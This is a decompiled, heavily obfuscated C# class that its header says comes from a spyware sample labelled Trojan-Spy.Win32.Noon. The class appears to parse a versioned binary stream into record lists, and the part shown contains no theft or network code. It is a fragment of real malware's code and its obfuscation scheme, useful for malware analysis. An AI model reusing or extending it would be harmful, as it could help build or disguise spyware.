// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

public sealed class \u0002\u2002 : \u000F\u2001
{
  private static readonly int[] \u0002;
  private string \u0003;
  private int \u0005;
  private ulong \u0008;
  private BindingList<\u0002\u2001> \u0006;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0002\u2002()
  {
    \u0003\u2004.\u0002();
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0002\u2002()
  {
    \u0003\u2004.\u0002();
    \u0002\u2002.\u0002 = new int[3]
    {
      9,
      10,
      11
    };
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int ValidateAccount() => this.\u0005;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public ulong ChangeAccount() => this.\u0008;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public BindingList<\u0002\u2001> InvokeAccount()
  {
    if (this.\u0006 == null)
      this.\u0006 = new BindingList<\u0002\u2001>();
    return this.\u0006;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public new void \u0002(string _param1)
  {
    this.\u0003 = _param1;
    this.\u0002();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002()
  {
    int num1 = 8;
    while (true)
    {
      int num2;
      \u0002\u2001 obj;
      bool flag;
      switch (num1)
      {
        case 0:
          this.\u0006.Add(obj);
          num2 = 7;
          break;
        case 1:
        case 2:
          this.InvokeAccount().Clear();
          if (Encoding.Default.GetString(this.ValidateRepository(), 0, 3) != \u0005\u2007.\u0002(-1359007980))
          {
            num1 = 4;
            continue;
          }
          this.\u0002(3);
          this.\u0005 = (int) base.\u0002();
          flag = !this.\u0002();
          num2 = 3;
          break;
        case 3:
          if (!flag)
          {
            this.\u0008 = base.\u0002();
            obj = (\u0002\u2001) null;
            goto case 5;
          }
          else
            goto label_12;
        case 4:
          goto label_9;
        case 5:
        case 6:
        case 7:
          num2 = 9;
          break;
        case 8:
          base.\u0002(this.\u0003);
          num1 = 2;
          continue;
        case 9:
          byte num3;
          try
          {
            num3 = this.\u0002(false);
          }
          catch (EndOfStreamException ex)
          {
            return;
          }
          int num4;
          switch (num3)
          {
            case 99:
              num4 = 1;
              break;
            case byte.MaxValue:
              goto label_17;
            default:
              num4 = num3 == (byte) 0 ? 1 : 0;
              break;
          }
          if (num4 == 0)
          {
            if (num3 == (byte) 2 || num3 == (byte) 1)
            {
              obj.CallAccount().Add(new \u0003\u2006(this));
              num2 = 5;
              break;
            }
            goto label_2;
          }
          else
          {
            obj = new \u0002\u2001(this);
            goto case 0;
          }
        default:
          num2 = 0;
          break;
      }
      num1 = num2;
    }
label_2:
    throw new Exception(\u0005\u2007.\u0002(-1359007947));
label_9:
    throw new Exception(\u0005\u2007.\u0002(-1359007970));
label_12:
    throw new Exception(\u0005\u2007.\u0002(-1359008015) + this.\u0005.ToString() + \u0005\u2007.\u0002(-1359008046));
label_17:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private new bool \u0002()
  {
    int num1 = 4;
    bool flag;
    while (true)
    {
      int num2 = num1;
      int[] numArray;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 5:
            goto label_1;
          case 1:
          case 3:
            goto label_8;
          case 4:
            numArray = \u0002\u2002.\u0002;
            num2 = 3;
            continue;
          case 6:
            goto label_9;
          case 7:
            goto label_12;
          default:
            num2 = 6;
            continue;
        }
      }
label_1:
      int index;
      if (index >= numArray.Length)
      {
        flag = false;
        num1 = 7;
        continue;
      }
      int num3 = numArray[index];
      goto label_9;
label_8:
      index = 0;
      num1 = 0;
      continue;
label_9:
      if (this.\u0005 != num3)
      {
        ++index;
        num1 = 5;
      }
      else
        break;
    }
    flag = true;
label_12:
    return flag;
  }

  internal new static bool \u0002() => true;

  internal new static bool \u0003() => false;
}
